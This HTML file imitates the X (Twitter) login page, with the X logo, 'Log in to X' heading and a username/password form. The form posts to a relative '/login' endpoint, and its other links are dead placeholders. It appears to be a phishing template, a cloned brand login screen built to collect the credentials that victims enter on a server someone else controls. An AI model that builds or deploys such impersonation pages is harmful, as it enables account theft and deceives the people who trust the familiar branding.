<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>X / Twitter - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
            padding: 20px;
        }
        .container {
            max-width: 380px;
            width: 100%;
            padding: 20px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo svg {
            width: 50px;
            height: 50px;
        }
        h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 24px;
            text-align: center;
        }
        .form-group {
            margin-bottom: 14px;
        }
        .form-group input {
            width: 100%;
            padding: 16px 14px;
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 6px;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: border-color 0.3s;
            -webkit-appearance: none;
        }
        .form-group input:focus {
            border-color: #1d9bf0;
        }
        .form-group input::placeholder {
            color: #666;
            font-size: 15px;
        }
        .login-btn {
            width: 100%;
            padding: 16px;
            background: #1d9bf0;
            border: none;
            border-radius: 30px;
            color: #fff;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.3s, opacity 0.2s;
            margin-top: 10px;
            touch-action: manipulation;
        }
        .login-btn:active {
            opacity: 0.8;
        }
        .login-btn:hover {
            background: #1a8cd8;
        }
        .links {
            text-align: center;
            margin-top: 18px;
            font-size: 14px;
            color: #666;
        }
        .links a {
            color: #1d9bf0;
            text-decoration: none;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .signup {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #666;
        }
        .signup a {
            color: #1d9bf0;
            text-decoration: none;
            font-weight: 600;
        }
        .signup a:hover {
            text-decoration: underline;
        }
        @media (max-width: 480px) {
            h1 { font-size: 24px; }
            .form-group input { padding: 14px 12px; font-size: 15px; }
            .login-btn { padding: 14px; font-size: 16px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24" fill="white"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
        </div>
        <h1>Log in to X</h1>
        <form id="loginForm" method="POST" action="/login" autocomplete="off">
            <div class="form-group">
                <input type="text" name="username" placeholder="Email or username" required autocomplete="username">
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
            </div>
            <button type="submit" class="login-btn">Log in</button>
            <div class="links">
                <a href="#">Forgot password?</a>
            </div>
        </form>
        <div class="signup">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const btn = this.querySelector('.login-btn');
            btn.textContent = 'Logging in...';
            btn.disabled = true;
            btn.style.opacity = '0.7';
        });
    </script>
</body>
</html>
